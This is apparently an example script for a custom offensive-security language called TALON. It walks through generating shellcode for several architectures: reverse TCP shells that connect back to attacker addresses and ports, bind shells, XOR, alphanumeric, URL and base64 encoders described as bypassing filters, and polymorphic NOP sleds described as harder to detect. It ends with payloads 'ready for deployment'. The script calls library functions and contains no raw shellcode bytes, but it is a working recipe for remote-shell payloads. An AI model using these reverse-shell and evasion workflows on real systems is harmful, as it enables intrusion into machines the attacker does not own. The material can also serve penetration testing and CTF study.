# ═══════════════════════════════════════════════════════════════
# ADVANCED SHELLCODE SHOWCASE
# World-class shellcode generation and encoding in TALON DSL
# ═══════════════════════════════════════════════════════════════

print("═══════════════════════════════════════════════════════════════")
print("  ADVANCED SHELLCODE SHOWCASE")
print("  Demonstrating world-class shellcode generation in TALON")
print("═══════════════════════════════════════════════════════════════")
print("")

# ────────────────────────────────────────────────────────────────
# EXAMPLE 1: Basic Shellcode Generation
# ────────────────────────────────────────────────────────────────

print("[1] Basic Shellcode Generation")
print("─────────────────────────────────────────────────────")

# Generate x64 execve shellcode
let shellcode_x64 = shellcode_gen(arch="x64", payload="execve")

# Generate x86 execve shellcode
let shellcode_x86 = shellcode_gen(arch="x86", payload="execve")

# Generate ARM execve shellcode
let shellcode_arm = shellcode_gen(arch="arm", payload="execve")

print("")

# ────────────────────────────────────────────────────────────────
# EXAMPLE 2: Reverse TCP Shellcode (Quick Method)
# ────────────────────────────────────────────────────────────────

print("[2] Reverse TCP Shellcode - Quick Method")
print("─────────────────────────────────────────────────────")

# Generate reverse TCP shellcode (connects back to attacker)
let reverse_shell = shellcode_reverse_tcp(lhost="192.168.1.100", lport=4444)

# Different architecture
let reverse_shell_x86 = shellcode_reverse_tcp(lhost="10.0.0.1", lport=4444, arch="x86")

print("")

# ────────────────────────────────────────────────────────────────
# EXAMPLE 3: Bind TCP Shellcode (Quick Method)
# ────────────────────────────────────────────────────────────────

print("[3] Bind TCP Shellcode - Quick Method")
print("─────────────────────────────────────────────────────")

# Generate bind TCP shellcode (listens on port)
let bind_shell = shellcode_bind_tcp(lport=4444)

# Different port
let bind_shell_8080 = shellcode_bind_tcp(lport=8080, arch="x64")

print("")

# ────────────────────────────────────────────────────────────────
# EXAMPLE 4: Shellcode with Encoding (Bypass Filters)
# ────────────────────────────────────────────────────────────────

print("[4] Shellcode Encoding - Bypass Filters")
print("─────────────────────────────────────────────────────")

# Generate shellcode with XOR encoding
let encoded_xor = shellcode_gen(arch="x64", payload="execve", encoder="xor", key=0x42)

# Generate shellcode with auto-selected XOR key (avoids bad chars)
let encoded_auto = shellcode_gen(arch="x64", payload="execve", encoder="xor")

# Alphanumeric encoding (only A-Z, a-z, 0-9)
let encoded_alnum = shellcode_gen(arch="x64", payload="execve", encoder="alphanumeric")

# URL encoding (for web exploits)
let encoded_url = shellcode_gen(arch="x64", payload="execve", encoder="url")

# Base64 encoding
let encoded_b64 = shellcode_gen(arch="x64", payload="execve", encoder="base64")

print("")

# ────────────────────────────────────────────────────────────────
# EXAMPLE 5: Shellcode with NOP Sled
# ────────────────────────────────────────────────────────────────

print("[5] Shellcode with NOP Sled")
print("─────────────────────────────────────────────────────")

# Generate shellcode with 256-byte NOP sled
let shellcode_with_nops = shellcode_gen(arch="x64", payload="execve", nop_sled=256)

# Just a NOP sled (static)
let nops_static = nop_sled(256)

# Polymorphic NOP sled (harder to detect)
let nops_poly = nop_sled(256, polymorphic="true")

print("")

# ────────────────────────────────────────────────────────────────
# EXAMPLE 6: Advanced Encoding Workflow
# ────────────────────────────────────────────────────────────────

print("[6] Advanced Encoding Workflow")
print("─────────────────────────────────────────────────────")

# Step 1: Generate raw shellcode
let raw_shellcode = shellcode_gen(arch="x64", payload="execve")

# Step 2: Encode it separately with bad character avoidance
let bad_chars = [0x00, 0x0a, 0x0d, 0x20]  # null, newline, CR, space
let encoded = shellcode_encode(raw_shellcode, encoder="xor", bad_chars=bad_chars)

# Alternative: Polymorphic encoding
let poly_encoded = shellcode_encode(raw_shellcode, encoder="polymorphic", min_nop=1, max_nop=5)

print("")

# ────────────────────────────────────────────────────────────────
# EXAMPLE 7: List Available Shellcodes
# ────────────────────────────────────────────────────────────────

print("[7] Available Shellcodes Database")
print("─────────────────────────────────────────────────────")

# List all available shellcodes in the database
shellcode_list()

print("")

# ────────────────────────────────────────────────────────────────
# EXAMPLE 8: Complex Reverse Shell with All Features
# ────────────────────────────────────────────────────────────────

print("[8] Complex Reverse Shell Exploit")
print("─────────────────────────────────────────────────────")

# Generate reverse shell with encoding and NOP sled
let complex_shell = shellcode_gen(
    arch="x64",
    payload="reverse_tcp",
    lhost="192.168.1.100",
    lport=4444,
    encoder="xor",
    key=0x55,
    nop_sled=128
)

print("Complex shellcode ready for deployment!")
print("")

# ────────────────────────────────────────────────────────────────
# EXAMPLE 9: CTF-Style Quick Exploit
# ────────────────────────────────────────────────────────────────

print("[9] CTF-Style Quick Exploit")
print("─────────────────────────────────────────────────────")

# Quick reverse shell for CTF
let ctf_shell = shellcode_reverse_tcp(lhost="127.0.0.1", lport=1337)

# Add NOP sled for reliability
let nop = nop_sled(64)
let final_payload = nop + ctf_shell

print("CTF payload ready!")
print("Payload size:", len(final_payload), "bytes")
print("")

# ────────────────────────────────────────────────────────────────
# EXAMPLE 10: Multi-Architecture Support
# ────────────────────────────────────────────────────────────────

print("[10] Multi-Architecture Support")
print("─────────────────────────────────────────────────────")

# Generate for all architectures
let sc_x64 = shellcode_gen(arch="x64", payload="execve")
let sc_x86 = shellcode_gen(arch="x86", payload="execve")
let sc_arm = shellcode_gen(arch="arm", payload="execve")

print("Generated shellcode for x64, x86, and ARM architectures")
print("")

print("═══════════════════════════════════════════════════════════════")
print("  SHOWCASE COMPLETE!")
print("  All shellcode generation features demonstrated")
print("═══════════════════════════════════════════════════════════════")
